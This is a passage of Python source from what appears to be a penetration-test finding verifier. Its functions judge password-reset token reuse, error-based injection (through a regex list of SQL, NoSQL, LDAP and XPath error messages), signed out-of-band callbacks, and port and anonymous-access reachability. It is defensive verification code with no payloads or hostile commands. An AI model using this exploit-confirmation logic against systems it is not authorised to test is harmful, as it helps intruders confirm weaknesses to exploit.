        to ONE principal; a deterministic-but-secure generator repeats for one user) ⇒ LEAD; genuine cross-
        principal exploitation is minted only by the ``password_reset_cross_user`` private-read differential. A
        set of distinct tokens (the benign twin) ⇒ channel-confirmed CLEAN; too few / too-short samples ⇒ LEAD.
        ENTROPY alone is never a FACT here.

    Pure + deterministic; never raises."""
    obs = observed if isinstance(observed, Mapping) else {}
    mode = _coerce_text(obs.get("mode")).strip()

    if mode == "token_reuse":
        reset_token = _coerce_text(obs.get("reset_token")).strip()
        discriminator = _coerce_text(obs.get("private_discriminator")).strip()
        replay_secret = _coerce_text(obs.get("replay_secret")).strip()
        consumed_secret = _coerce_text(obs.get("consumed_secret")).strip()
        authorized_secret = _coerce_text(obs.get("authorized_secret")).strip()
        base = {"reset_token_len": len(reset_token), "discriminator_len": len(discriminator),
                "replay_secret_bound": False}
        # P2-BINDING (mirror session fixation's sentinel-binding): the achieved read MUST be attributable to the
        # REPLAY-set secret P2, not the consumed P1 / a leftover consume-session — else a single-use token whose
        # replay set nothing could still read D via the first consume and mint a FALSE reuse FACT. Fail ⇒ LEAD.
        bind_fail = _prt_reuse_p2_binding(replay_secret, consumed_secret, authorized_secret,
                                          discriminator, obs.get("authorized_view"))
        if bind_fail is not None:
            return _prt_signal(False, mode=mode, observed=base, evidence=bind_fail)
        base["replay_secret_bound"] = True
        # RE-DERIVE the achieved changed state from RAW retained bytes via the PRIVATE-READ REDUCTION — the same
        # same-shape differential Wave-3.1/3.2 use. The consumed-then-replayed token is passed as the sentinel so
        # its reflected-value / straddle guard masks any echo of the token itself (a reset token must never be
        # the datum that satisfies the read). None ⇒ undecidable ⇒ LEAD.
        achieved = _sfx_private_read_achieved(
            discriminator, obs.get("authorized_view"), obs.get("owner_view"),
            obs.get("unauth_ref"), obs.get("logged_out_ref"),
            obs.get("logged_out_markers"), obs.get("logged_out_statuses"),
            sentinel_id=reset_token)
        if achieved is None:
            return _prt_signal(
                False, mode=mode, observed=base,
                evidence=("password-reset token-reuse could not be proven by the PRIVATE-READ differential (no "
                          "valid victim-private datum D; D reflects/straddles the reset token; a non-substantive "
                          "replay-authenticated read; no substantive owner positive reference or D absent from "
                          "it; no substantive SAME-SHAPE unauthorized reference; no valid no-session baseline; or "
                          "D present in a negative reference) — cannot mint (LEAD)"))
        if achieved is not True:
            return _prt_signal(
                False, mode=mode, conclusive=True, observed=base,
                evidence=("the reset token, once consumed, no longer set a new credential on replay — the "
                          "replay-set secret does not reach the victim's private view (single-use / expiring "
                          "token, the correct defense); did not fire"))
        return _prt_signal(
            True, mode=mode, conf=0.92, observed={**base, "reset_token": reset_token,
                                                  "differential": "replay_set_credential_reaches_private_datum_"
                                                  "absent_in_same_shape_unauthorized_and_no_session_reads"},
            evidence=("password-reset token REUSE / NON-EXPIRY: a reset token that was already CONSUMED was "
                      "REPLAYED to set a SECOND unique VIGIL secret P2 (distinct from the consumed P1) and the "
                      "second submit GENUINELY changed the credential — authenticating WITH P2 reaches a "
                      "victim-PRIVATE datum D that is PRESENT in the owner's authoritative read yet PROVABLY "
                      "ABSENT from a SUBSTANTIVE SAME-SHAPE unauthorized read and a no-session baseline (the "
                      "P2-bound private-read reduction proves the REPLAY re-changed the credential, not a bare "
                      "200 nor a leftover consume-session) — the recovery token is reusable / does not expire"))

    if mode == "token_collision":
        fired, detail = _prt_collision(obs.get("samples") if obs.get("samples") is not None else obs.get("tokens"))
        if fired is None:
            return _prt_signal(
                False, mode=mode, observed=detail,
                evidence=("no genuinely-exploitable reset-token collision could be adjudicated from the tokens "
                          "alone: too few / too-short samples (need >=2 captures of length >= 8), OR a "
                          "BYTE-IDENTICAL token that repeats — whether for the SAME account LABEL or across "
                          "DIFFERENT account LABELS. A byte-identical repeat is NOT an exploitable collision here: "
                          "account labels are never proven to be distinct PRINCIPALS (a benign identifier-"
                          "NORMALIZING generator returns identical tokens for 'alice'/'Alice' = ONE principal) and "
                          "a cryptographically-secure DETERMINISTIC generator (e.g. Django default_token_generator "
                          "within a timestamp bucket, or a cache-one-token-per-account app) returns identical "
                          "tokens for one user — a LEAD to escalate via the password_reset_cross_user private-read "
                          "differential, never a FACT here"))
        if fired is False:
            return _prt_signal(
                False, mode=mode, conclusive=True, observed=detail,
                evidence=("the independent reset requests returned DISTINCT tokens with no exact arithmetic "
                          "progression — proper generation (entropy is not scored here); did not fire"))
        # A fire here is EXCLUSIVELY the PREDICTABLE-COUNTER shape (an exact arithmetic progression). The
        # byte-identical cross-label 'collision' FACT path is RETIRED (⇒ LEAD): account-label identity never
        # proves distinct PRINCIPALS, so genuine cross-principal exploitation is minted only by the
        # password_reset_cross_user private-read differential, never from token identity.
        return _prt_signal(
            True, mode=mode, conf=0.95, observed=detail,
            evidence=(f"deterministic password-reset token COLLISION: {detail.get('samples')} independent reset "
                      f"requests returned tokens forming an EXACT arithmetic progression (constant step "
                      f"{detail.get('step')!r}) — the recovery token is a predictable counter, not a random value; "
                      f"observe one token and the victim's is predictable (exploitable regardless of identity)"))

    return _prt_signal(
        False, mode=(mode or "unknown"), observed={},
        evidence="unknown/absent password-reset invariant mode — cannot adjudicate (inconclusive)")


# ---------------------------------------------------------------------------
# 4b. Error signature — a datastore/parser error a payload provoked (error-based)
# ---------------------------------------------------------------------------


# (regex, engine, confidence). Distinctive server-side error strings that only a
# malformed query/expression provokes — the signature of error-based injection.
# Ordered strongest-first; the strongest match wins.
_ERROR_SIGNATURES: list[tuple[re.Pattern[str], str, float]] = [
    # --- SQL: MySQL / MariaDB ---
    (re.compile(r"You have an error in your SQL syntax", re.I), "mysql", 0.95),
    (re.compile(r"check the manual that corresponds to your (MySQL|MariaDB) server version", re.I), "mysql", 0.95),
    (re.compile(r"\bwarning:\s*mysqli?_", re.I), "mysql", 0.85),
    (re.compile(r"MySQLSyntaxErrorException|com\.mysql\.jdbc", re.I), "mysql", 0.9),
    (re.compile(r"valid MySQL result|Unknown column '[^']+' in 'field list'", re.I), "mysql", 0.85),
    # --- SQL: PostgreSQL ---
    (re.compile(r"PostgreSQL.*ERROR|PG::(Syntax|Undefined)|pg_query\(\)|org\.postgresql", re.I), "postgresql", 0.95),
    (re.compile(r"unterminated quoted string at or near|syntax error at or near", re.I), "postgresql", 0.9),
    # --- SQL: MSSQL ---
    (re.compile(r"Unclosed quotation mark after the character string", re.I), "mssql", 0.95),
    (re.compile(r"Microsoft SQL (Server|Native Client)|System\.Data\.SqlClient\.SqlException", re.I), "mssql", 0.92),
    (re.compile(r"Incorrect syntax near|\[SQL Server\]", re.I), "mssql", 0.9),
    # --- SQL: Oracle ---
    (re.compile(r"\bORA-\d{5}\b", re.I), "oracle", 0.95),
    (re.compile(r"Oracle.*(Driver|Database)|quoted string not properly terminated", re.I), "oracle", 0.9),
    # --- SQL: SQLite ---
    (re.compile(r"SQLite/JDBCDriver|SQLite\.Exception|System\.Data\.SQLite|sqlite3\.OperationalError", re.I), "sqlite", 0.92),
    (re.compile(r"unrecognized token:|SQL logic error|near \"[^\"]*\": syntax error", re.I), "sqlite", 0.88),
    # --- SQL: generic JDBC/ODBC ---
    (re.compile(r"java\.sql\.SQLException|SQLSTATE\[|ODBC.*Driver.*error", re.I), "sql-generic", 0.8),
    # --- NoSQL ---
    (re.compile(r"MongoError|E11000 duplicate key|BSONError|com\.mongodb", re.I), "mongodb", 0.85),
    # --- LDAP ---
    (re.compile(r"javax\.naming\.directory|LDAPException|Invalid DN syntax|com\.sun\.jndi\.ldap", re.I), "ldap", 0.82),
    # --- XPath ---
    (re.compile(r"XPathException|MS\.Internal\.Xml|Expression must evaluate to a node-set|xmlXPathEval", re.I), "xpath", 0.82),
]


def error_signature_oracle(observed_body: Any, control_body: Any = None) -> OracleSignal:
    """Fire when a response contains a distinctive **datastore/parser error** that
    a malformed injection payload provoked — the signature of error-based injection
    (SQL/NoSQL/LDAP/XPath).

    Two guards keep it precise: the error string must be a known, engine-specific
    signature (not a generic "error" word), AND — when a benign ``control_body`` is
    supplied — the SAME signature must be ABSENT from the control, so a page that
    always shows a stack trace cannot be mistaken for an injection. This is the
    error-based analogue of the sanitizer oracle: a real backend error is strong,
    attributable evidence the input reached and broke the query parser."""
    body = _coerce_text(observed_body)
    control = _coerce_text(control_body) if control_body is not None else ""

    for pattern, engine, conf in _ERROR_SIGNATURES:
        m = pattern.search(body)
        if not m:
            continue
        if control and pattern.search(control):
            # the same error is present without the payload -> not attributable
            continue
        line = _line_of(body, m.start())
        return OracleSignal(
            kind=OracleKind.ERROR_SIGNATURE,
            fired=True,
            confidence=conf,
            evidence=f"{engine} error provoked by the payload: {line.strip()[:200]}",
            observed={"engine": engine, "match": m.group(0)[:200]},
        )

    return OracleSignal(
        kind=OracleKind.ERROR_SIGNATURE, fired=False, confidence=0.0,
        evidence="no datastore/parser error signature in the response",
        observed={})


# ---------------------------------------------------------------------------
# 5. Out-of-band callback — inbound interaction against a unique token
# ---------------------------------------------------------------------------


_OOB_DEFAULT_SKEW_S: float = 5.0   # clock-skew tolerance applied to BOTH window edges when a window is set
# Out-of-band fallback TTL DURATION (seconds) for a receipt-bearing hit when the caller threaded no explicit
# authority TTL (e.g. a loopback self-check with a VIGIL-minted collector, where there is no untrusted
# producer). It is a FIXED module constant — NEVER read from the producer context — so it can only ever make
# the window tighter/equal, never producer-widenable. The real deployment threads authority.oob_ttl_seconds.
_OOB_DEFAULT_TTL_S: float = 300.0


def _hit_received_at(hit: Any) -> float:
    if isinstance(hit, Mapping):
        return float(hit.get("received_at") or 0.0)
    return float(getattr(hit, "received_at", 0.0) or 0.0)


def _hit_collector_sig(hit: Any) -> str:
    if isinstance(hit, Mapping):
        return str(hit.get("collector_sig") or "")
    return str(getattr(hit, "collector_sig", "") or "")


def _hit_is_dns(hit: Any) -> bool:
    if isinstance(hit, Mapping):
        m = hit.get("method")
    else:
        m = getattr(hit, "method", "")
    return str(m or "").upper() == "DNS"


def oob_callback_oracle(hits: Any, expected_token: "str | None" = None,
                        collector_pubkey: "str | None" = None, *,
                        dns_collector_pubkey: "str | None" = None,
                        issued_at: "float | None" = None, expires_at: "float | None" = None,
                        skew: "float | None" = None,
                        authority_ttl: "float | None" = None,
                        authority_skew: "float | None" = None,
                        authority_not_before: "float | None" = None,
                        authority_not_after: "float | None" = None) -> OracleSignal:
    """Fire when the out-of-band collector logged an inbound interaction that carried the finding's REGISTERED
    per-finding secret token. The token — minted per finding (`oob.register_token`, `secrets.token_hex(16)`)
    and embedded in the callback URL/host the target must actually execute to emit — is what makes a blind-
    execution callback (SSRF, OOB SQLi, blind XXE, deserialization, and a DNS-only lookup via the authoritative
    DNS collector) close to unforgeable. `hits` is whatever `oob.poll()` returned; `expected_token` is that
    registered secret (carried on the context as `oob_token`).

    VF-2a (token): a callback that does NOT carry the registered token — or a context with no registered token
    to compare against — is NOT trusted. Fail-closed:
      * no `hits` → not fired; `hits` but NO `expected_token` → not fired; none carry the token → not fired;
      * ≥1 hit whose token == `expected_token` (constant-time) AND that carries NO collector receipt → fired
        at the genuine VF-2a token-only tier (its honest limit: it does NOT defeat a fully-dishonest producer).

    VF-2b (independent collector receipt): a token-matched hit that CARRIES a collector signature (the receiver
    signed it, so VF-2b was INTENDED) MUST have that receipt verify against an OUT-OF-BAND-pinned collector key
    — ``dns_collector_pubkey`` for a DNS observation (``method == "DNS"``), else ``collector_pubkey`` — pinned
    by the VERIFIER, never read from the producer-controlled context. Fail-CLOSED, and CRUCIALLY distinct from
    a silent token-only drop:
      * receipt present but the applicable pin is None/blank → REFUSE ("no pinned collector key to verify");
      * receipt present but it does not verify against the pin → REFUSE (SIGNATURE_INVALID);
      * a fully-dishonest producer cannot forge a receipt that verifies under a pin it does not hold.
    This closes the offline fail-open where a VF-2b FACT re-verified without a pin dropped to token-only.

    TTL / replay — REQUIRED for a receipt-bearing hit; the ANTI-REPLAY BOUNDARY is the OWNER-SIGNED
    ENGAGEMENT WINDOW. Once a receipt verifies:
      * a producer mint anchor ``issued_at`` MUST be present (refused if absent) — kept as an ADVISORY
        tight-freshness hint whose DURATION + skew are taken OUT-OF-BAND (``authority_ttl`` /
        ``authority_skew``, else fixed module constants; NEVER the producer-supplied ``expires_at`` /
        ``skew``): ``[issued_at - askew, issued_at + attl + askew]``. It may only NARROW the acceptance
        window; it is NEVER the sole anti-replay boundary, because ``issued_at`` is producer-controlled and
        a fully-dishonest producer can SLIDE it onto a stale receipt's ``received_at``.
      * when a SIGNED engagement window is threaded (``authority_not_before`` / ``authority_not_after`` from
        the SAME owner-signed ``EngagementAuthority`` that supplied the pin — never the producer ctx), the
        receipt's TARGET-OBSERVED ``received_at`` MUST ALSO fall inside
        ``[not_before - askew, not_after + askew]``. This is non-forgeable: the producer cannot move an
        owner-signed window, so a year-1970 or PRIOR-ENGAGEMENT ``received_at`` is refused even with
        ``issued_at`` slid onto it. The effective window is the INTERSECTION of the two (the advisory TTL
        narrows within the signed boundary). Outside → ``EXPIRED`` (before it opened) / ``REPLAY`` (after it
        closed). When no signed window is threaded (a direct/self-check call), only the advisory TTL applies
        — the real offline/live path always threads the signed window alongside the pin.

    Residual (honest): the SIGNED engagement window CLOSES cross-engagement and gross-stale (e.g. year-1970)
    replay and cannot be slid — EXCEPT in the narrow corner where the SAME owner-signed collector pin is
    reused across two engagements whose authorized windows OVERLAP: a receipt observed during the overlap has
    a signed ``received_at`` that is temporally in-scope for BOTH windows, so it degenerates into the
    intra-window residual below (it is NOT a stale / out-of-scope replay). An INTRA-engagement slide by a
    fully-dishonest producer likewise remains possible — a REAL receipt observed DURING the authorized window,
    re-presented later within the SAME window — because the mint time is not cryptographically committed into
    the token (see ``LIMIT-dns-oob-token-cleartext-broadcast``). Both residuals are BOUNDED to an owner-signed
    engagement window; distinct collector pins or non-overlapping windows eliminate the cross-engagement case.

    VF-2a legacy window: for a token-only hit that carries NO receipt, when the producer context supplies a
    window (``issued_at`` and/or ``expires_at``) the prior additive check applies over it; both bounds absent
    ⇒ skipped ⇒ BYTE-IDENTICAL to the original windowless behaviour (the default/benchmark path). The decision
    is over RETAINED timestamps only (no wall-clock), so offline re-verify applies the SAME check."""
    from .oob import verify_oob_receipt   # local import keeps the module import graph acyclic

    hit_list = list(hits or [])
    if not hit_list:
        return OracleSignal(
            kind=OracleKind.OOB_CALLBACK, fired=False, confidence=0.0,
            evidence="no out-of-band interaction observed", observed={"hit_count": 0})

    want = str(expected_token or "")
    if not want:
        return OracleSignal(
            kind=OracleKind.OOB_CALLBACK, fired=False, confidence=0.0,
            evidence=(f"{len(hit_list)} out-of-band interaction(s) but NO registered per-finding token to "
                      f"verify them — a callback cannot be distinguished from a fabricated/unrelated hit "
                      f"(fail-closed)"),
            observed={"hit_count": len(hit_list), "token_verified": False})

    matched = [h for h in hit_list if _hit_token_matches(h, want)]
    if not matched:
        return OracleSignal(
            kind=OracleKind.OOB_CALLBACK, fired=False, confidence=0.0,
            evidence=(f"{len(hit_list)} out-of-band interaction(s) but NONE carried the registered per-finding "
                      f"token — forged/unrelated callback (fail-closed)"),
            observed={"hit_count": len(hit_list), "matched": 0, "token_verified": False})

    # Split token-matched hits by whether the collector SIGNED a receipt. A signed hit means VF-2b was
    # INTENDED — it must be verified against an out-of-band pin or REFUSED (never a silent token-only drop);
    # an unsigned hit is a genuine VF-2a token-only observation (byte-identical to the original behaviour).
    receipt_bearing = [h for h in matched if _hit_collector_sig(h)]

    if receipt_bearing:
        verified: list[Any] = []
        for h in receipt_bearing:
            pin = dns_collector_pubkey if _hit_is_dns(h) else collector_pubkey
            if pin is None or not str(pin).strip():
                # A receipt is present but no OUT-OF-BAND pinned collector key is available to check it. This
                # is the offline fail-open the fix closes: REFUSE, do NOT drop to the forgeable token-only tier.
                chan = "DNS" if _hit_is_dns(h) else "HTTP"
                return OracleSignal(
                    kind=OracleKind.OOB_CALLBACK, fired=False, confidence=0.0,
                    evidence=(f"VF-2b receipt present but no pinned {chan} collector key to verify — fail-closed, "
                              f"NOT a silent token-only drop"),
                    observed={"hit_count": len(hit_list), "matched": len(receipt_bearing),
                              "token_verified": True, "receipt_verified": False,
                              "oob_verdict": "UNVERIFIABLE_RECEIPT"})
            if verify_oob_receipt(h, collector_pubkey=pin):
                verified.append(h)
        if not verified:
            return OracleSignal(
                kind=OracleKind.OOB_CALLBACK, fired=False, confidence=0.0,
                evidence=(f"token-matched out-of-band interaction(s) carried a collector receipt but NONE "
                          f"verifies against the pinned collector key — a fully-dishonest producer cannot forge "
                          f"one (fail-closed)"),
                observed={"hit_count": len(hit_list), "matched": 0, "token_verified": True,
                          "receipt_verified": False, "oob_verdict": "SIGNATURE_INVALID"})

        # TTL / replay window is REQUIRED for a receipt-bearing hit. The ANTI-REPLAY BOUNDARY is the
        # OWNER-SIGNED ENGAGEMENT WINDOW; the producer mint anchor is an ADVISORY tight-freshness hint that
        # may only narrow. A missing mint anchor ⇒ refuse.
        if issued_at is None:
            return OracleSignal(
                kind=OracleKind.OOB_CALLBACK, fired=False, confidence=0.0,
                evidence=("VF-2b receipt verified but the finding carries NO mint anchor (issued_at) to bound "
                          "its replay window — fail-closed (a receipt without a window is replayable)"),
                observed={"hit_count": len(hit_list), "matched": len(verified), "token_verified": True,
                          "receipt_verified": True, "oob_verdict": "WINDOW_MISSING"})
        attl = _OOB_DEFAULT_TTL_S if authority_ttl is None else float(authority_ttl)
        askew = _OOB_DEFAULT_SKEW_S if authority_skew is None else float(authority_skew)
        # Advisory tight-freshness window, anchored at the PRODUCER mint anchor. Producer-slidable, so it is
        # only ever allowed to NARROW the acceptance window — never to be the sole boundary.
        lo = float(issued_at) - askew
        hi = float(issued_at) + attl + askew
        # ANTI-REPLAY BOUNDARY (the fix): intersect with the OWNER-SIGNED engagement window when it was
        # threaded from the signed authority. not_before/not_after are non-forgeable, so a producer that
        # slides issued_at onto a stale receipt cannot move them — a year-1970 / prior-engagement received_at
        # falls outside THIS authority's window and is refused. Intersection ⇒ the signed window always
        # bounds; the advisory TTL can only tighten within it.
        # A receipt-bearing (VF-2b) hit's anti-replay boundary MUST be the OWNER-SIGNED window. Production
        # always threads BOTH edges together (EngagementAuthority.not_before/not_after are mandatory, with
        # not_after > not_before), and a direct/self-check call threads NEITHER (advisory-TTL only). A
        # HALF-threaded window (exactly one edge) would leave the other boundary on the producer-slidable
        # advisory anchor — neither a clean self-check nor a sound signed window — so refuse it fail-closed
        # rather than trust a producer-movable edge. Unreachable via verifier_from_authority /
        # _engage_oob_authority; this closes the hand-constructed corner.
        nb_set = authority_not_before is not None
        na_set = authority_not_after is not None
        if nb_set != na_set:
            return OracleSignal(
                kind=OracleKind.OOB_CALLBACK, fired=False, confidence=0.0,
                evidence=("VF-2b receipt verified but only HALF of the owner-signed engagement window was "
                          "threaded (one of not_before/not_after) — the other anti-replay boundary would be "
                          "producer-slidable; fail-closed (a partial signed window is not a sound boundary)"),
                observed={"hit_count": len(hit_list), "matched": len(verified), "token_verified": True,
                          "receipt_verified": True, "oob_verdict": "INCOMPLETE_SIGNED_WINDOW",
                          "signed_window": False})
        signed_window = nb_set and na_set
        if nb_set:
            lo = max(lo, float(authority_not_before) - askew)
        if na_set:
            hi = min(hi, float(authority_not_after) + askew)
        window_label = "owner-signed engagement window (∩ advisory TTL)" if signed_window else \
                       "authority-bound TTL window"
        in_window = [h for h in verified if lo <= _hit_received_at(h) <= hi]
        if not in_window:
            ra = _hit_received_at(verified[0])
            verdict = "EXPIRED" if ra < lo else "REPLAY"
            return OracleSignal(
                kind=OracleKind.OOB_CALLBACK, fired=False, confidence=0.0,
                evidence=(f"{len(verified)} VF-2b out-of-band interaction(s) but NONE fell within the "
                          f"{window_label} [{lo:.3f}, {hi:.3f}] — observed received_at {ra:.3f} is "
                          f"outside it → {verdict} (fail-closed, not VERIFIED)"),
                observed={"hit_count": len(hit_list), "matched": len(verified), "token_verified": True,
                          "receipt_verified": True, "in_window": 0, "oob_verdict": verdict,
                          "window": [lo, hi], "observed_received_at": ra,
                          "signed_window": signed_window})
        matched = in_window
        summary = _hit_summary(matched[0])
        return OracleSignal(
            kind=OracleKind.OOB_CALLBACK, fired=True, confidence=0.95,
            evidence=(f"{len(matched)} F4 (token + independent collector receipt) out-of-band interaction(s); "
                      f"first: {summary}"),
            observed={"hit_count": len(hit_list), "matched": len(matched), "token_verified": True,
                      "receipt_verified": True, "oob_verdict": "VERIFIED", "in_window": len(matched),
                      "signed_window": signed_window, "first": summary})

    # -- No receipt on any token-matched hit: the genuine VF-2a token-only tier. -----------------------------
    if collector_pubkey is not None or dns_collector_pubkey is not None:
        # A pin was requested (F4) but NO token-matched hit carries a receipt — it can never satisfy the
        # receipt demand, so fail-closed (symmetric with verify_oob_receipt), never a silent token-only fire.
        both_blank = (collector_pubkey is None or not str(collector_pubkey).strip()) and \
                     (dns_collector_pubkey is None or not str(dns_collector_pubkey).strip())
        reason = ("F4 (collector receipt) requested but the pinned collector key is empty (fail-closed)"
                  if both_blank else
                  "F4 (collector receipt) requested but NO token-matched hit carried a collector receipt "
                  "(fail-closed)")
        return OracleSignal(
            kind=OracleKind.OOB_CALLBACK, fired=False, confidence=0.0,
            evidence=reason,
            observed={"hit_count": len(hit_list), "matched": len(matched), "token_verified": True,
                      "receipt_verified": False})

    # collector_pubkey is None ⇒ intentional VF-2a token-only tier. Legacy producer window (additive) —
    # skipped when both bounds are None ⇒ BYTE-IDENTICAL to the original windowless behaviour.
    if issued_at is not None or expires_at is not None:
        sk = _OOB_DEFAULT_SKEW_S if skew is None else float(skew)
        lo = (float(issued_at) - sk) if issued_at is not None else float("-inf")
        hi = (float(expires_at) + sk) if expires_at is not None else float("inf")
        in_window = [h for h in matched if lo <= _hit_received_at(h) <= hi]
        if not in_window:
            ra = _hit_received_at(matched[0])
            verdict = "EXPIRED" if ra < lo else "REPLAY"
            return OracleSignal(
                kind=OracleKind.OOB_CALLBACK, fired=False, confidence=0.0,
                evidence=(f"{len(matched)} token-verified out-of-band interaction(s) but NONE fell within the "
                          f"per-finding TTL window [{lo:.3f}, {hi:.3f}] — observed received_at {ra:.3f} is "
                          f"outside it → {verdict} (fail-closed, not VERIFIED)"),
                observed={"hit_count": len(hit_list), "matched": len(matched), "token_verified": True,
                          "receipt_verified": False, "in_window": 0, "oob_verdict": verdict,
                          "window": [lo, hi], "observed_received_at": ra})
        matched = in_window

    summary = _hit_summary(matched[0])
    observed: dict[str, Any] = {"hit_count": len(hit_list), "matched": len(matched), "token_verified": True,
                                "receipt_verified": False, "first": summary}
    if issued_at is not None or expires_at is not None:
        observed["oob_verdict"] = "VERIFIED"
        observed["in_window"] = len(matched)
    return OracleSignal(
        kind=OracleKind.OOB_CALLBACK,
        fired=True,
        confidence=0.95,
        evidence=f"{len(matched)} token-verified out-of-band interaction(s); first: {summary}",
        observed=observed,
    )


def _hit_token(hit: Any) -> str:
    if isinstance(hit, Mapping):
        return str(hit.get("token") or "")
    return str(getattr(hit, "token", "") or "")


def _hit_token_matches(hit: Any, want: str) -> bool:
    """Constant-time equality of a hit's self-reported token against the registered secret."""
    tok = _hit_token(hit)
    return bool(tok) and hmac.compare_digest(tok, want)


def _hit_summary(hit: Any) -> str:
    if isinstance(hit, Mapping):
        return f"{hit.get('method', '?')} {hit.get('path', '?')} from {hit.get('client_ip', '?')}"
    method = getattr(hit, "method", "?")
    path = getattr(hit, "path", "?")
    client = getattr(hit, "client_ip", "?")
    return f"{method} {path} from {client}"


# ---------------------------------------------------------------------------
# Service reachability — a real transport handshake reproduced (port open)
# ---------------------------------------------------------------------------


def service_reachability_oracle(observed_handshake: Any) -> OracleSignal:
    """Fire when a REAL transport handshake to a service reproduced — a completed TCP connect to the
    claimed host:port (optionally corroborated by a service banner the endpoint sent). This is what
    promotes a scanner's "open 443" OBSERVATION (Nmap et al.) into a reachability FACT: the port is
    open iff a live handshake actually connected, judged here over the RETAINED connect evidence —
    pure, deterministic, and re-runnable offline, so a scanner's say-so alone never confirms.

    ``observed_handshake`` is the JSON-safe evidence a reachability probe captured::

        {"connected": bool, "host": str, "port": int, "protocol": "tcp"|"udp",
         "peer": "ip:port"?, "banner": str?, "error": str?}

    Fires only when ``connected is True`` AND the evidence names the concrete host+port the connect
    resolved to. A completed TCP three-way handshake IS the proof of reachability, so a bare connect
    confirms at 0.90; a captured service BANNER — raw application-layer bytes the endpoint actually
    sent, a genuine re-derivable artifact — raises it to 0.97. (The captured ``peer`` is retained for
    the audit trail but does NOT raise confidence: ``getpeername`` returns the very port we dialled,
    so a "peer port matches" check is self-referential and would over-state a bare connect.) A refused
    / timed-out / UDP-without-a-banner / malformed handshake does not fire — an absent or negative
    signal is never an assumed pass.

    GROUNDING is procedural, exactly as for every oracle: the handshake MUST originate from a real
    gated capture (``verify.reachability.capture_handshake``), never a scanner's parsed "open" row —
    that is what keeps this a re-verification rather than a rubber-stamp of the scanner's say-so."""
    if not isinstance(observed_handshake, Mapping):
        return OracleSignal(kind=OracleKind.SERVICE_REACHABILITY, fired=False, confidence=0.0,
                            evidence="no handshake evidence")
    hs = observed_handshake
    connected = hs.get("connected")
    host = _coerce_text(hs.get("host")).strip()
    protocol = (_coerce_text(hs.get("protocol")).strip().lower() or "tcp")
    try:
        port_i = int(hs["port"]) if hs.get("port") is not None else None
    except (TypeError, ValueError, KeyError):
        port_i = None

    if connected is not True or not host or port_i is None:
        reason = _coerce_text(hs.get("error")).strip() or "no completed handshake to a concrete host:port"
        return OracleSignal(
            kind=OracleKind.SERVICE_REACHABILITY, fired=False, confidence=0.0,
            evidence=f"not reachable: {reason}",
            observed={"host": host, "port": port_i, "connected": connected})

    banner = _coerce_text(hs.get("banner")).strip()
    peer = _coerce_text(hs.get("peer")).strip()
    # UDP has no connection handshake — only an application-layer response proves reachability.
    if protocol == "udp" and not banner:
        return OracleSignal(
            kind=OracleKind.SERVICE_REACHABILITY, fired=False, confidence=0.0,
            evidence="udp reachability needs a service response (no banner)",
            observed={"host": host, "port": port_i, "protocol": protocol})

    # Only a real service banner corroborates beyond the bare handshake — the captured peer port is
    # definitionally the one we dialled, so it carries no independent signal.
    confidence = 0.97 if banner else 0.90
    detail = f"banner {banner[:48]!r}" if banner else (f"peer {peer}" if peer else "tcp connect")
    return OracleSignal(
        kind=OracleKind.SERVICE_REACHABILITY, fired=True, confidence=confidence,
        evidence=f"{protocol} handshake reproduced to {host}:{port_i} ({detail})",
        observed={"host": host, "port": port_i, "protocol": protocol,
                  "peer": peer, "banner": banner[:96]})


# ---------------------------------------------------------------------------
# Active exposure — an anonymous, UNAUTHENTICATED HTTP GET actually reached a public resource
# ---------------------------------------------------------------------------


def anonymous_reachable_oracle(observed_capture: Any) -> OracleSignal:
    """Fire when a bounded, UNAUTHENTICATED HTTP GET actually reached a resource anonymously — the
    endpoint answered a credential-free request with an HTTP 2xx and a non-empty body. This is what
    promotes a cloud POSTURE fact ("this bucket is public" — an anonymous grant path the POLICY_PATH
    oracle re-derived over the retained export) into an ACTIVE-EXPOSURE FACT: the resource is not merely
    *configured* public, it is *provably* fetchable by anyone, judged here over the RETAINED capture
    ALONE — pure, deterministic, re-runnable offline, so a posture heuristic alone never confirms it.

    ``observed_capture`` is the JSON-safe evidence a gated anonymous GET captured
    (``verify.reachability_cloud.capture_anonymous_get``)::

        {"url": str, "status": int|None, "body_len": int, "snippet": str,
         "content_type": str, "authenticated": bool, "error": str?}

    Fires iff (a) the request was UNAUTHENTICATED — the capture does NOT record credentials
    (``authenticated`` is not ``True``): this oracle proves ANONYMOUS reachability, so a capture that
    admits it carried auth must NOT confirm; AND (b) ``status`` is an integer in 200..299 — a real
    success, so a 3xx redirect, a 401/403 (present-but-protected — the OPPOSITE of the claim), a 404
    (absent), or a ``None`` (gate refusal / connect failure) does NOT fire; AND (c) ``body_len`` > 0 —
    the endpoint actually returned content, not an empty 204/200. A completed anonymous 2xx-with-body IS
    the proof of public reachability. An absent or negative signal is never an assumed pass.

    GROUNDING is procedural, exactly as for ``service_reachability_oracle``: the capture MUST originate
    from a real gated GET (``capture_anonymous_get``: kill-switch -> single-host -> ACTIVE_RECON ->
    charter scope, credential-free), never a posture tool's "public=true" say-so — that is what keeps
    this a re-verification of *reachability* rather than a rubber-stamp of the *configuration*."""
    if not isinstance(observed_capture, Mapping):
        return OracleSignal(kind=OracleKind.ACTIVE_EXPOSURE, fired=False, confidence=0.0,
                            evidence="no capture evidence")
    cap = observed_capture
    url = _coerce_text(cap.get("url")).strip()
    # status is the AUTHORITY's input — accept ONLY a real int (a bool or a "200" string is NOT a status);
    # anything else is UNKNOWN → no fact (C3 red-pen LOW-1: the sole oracle must not coerce a non-int).
    raw_status = cap.get("status")
    status = raw_status if isinstance(raw_status, int) and not isinstance(raw_status, bool) else None
    try:
        body_len = int(cap.get("body_len") or 0)
    except (TypeError, ValueError):
        body_len = 0

    # (a) an anonymous proof must not have carried credentials — refuse ANY truthy `authenticated` (a
    # string "true" must not evade a strict `is True`; C3 red-pen LOW-1).
    if bool(cap.get("authenticated")):
        return OracleSignal(
            kind=OracleKind.ACTIVE_EXPOSURE, fired=False, confidence=0.0,
            evidence="capture carried credentials — cannot prove ANONYMOUS reachability",
            observed={"url": url, "status": status, "authenticated": True})
    # (b)/(c) an unauthenticated 2xx with a present body, judged over the retained response alone.
    if status is None or not (200 <= status <= 299) or body_len <= 0:
        reason = _coerce_text(cap.get("error")).strip() or (
            f"status {status}, body_len {body_len} — not an unauthenticated 2xx with a present body")
        return OracleSignal(
            kind=OracleKind.ACTIVE_EXPOSURE, fired=False, confidence=0.0,
            evidence=f"not anonymously reachable: {reason}",
            observed={"url": url, "status": status, "body_len": body_len})

    content_type = _coerce_text(cap.get("content_type")).strip()
    return OracleSignal(
        kind=OracleKind.ACTIVE_EXPOSURE, fired=True, confidence=0.95,
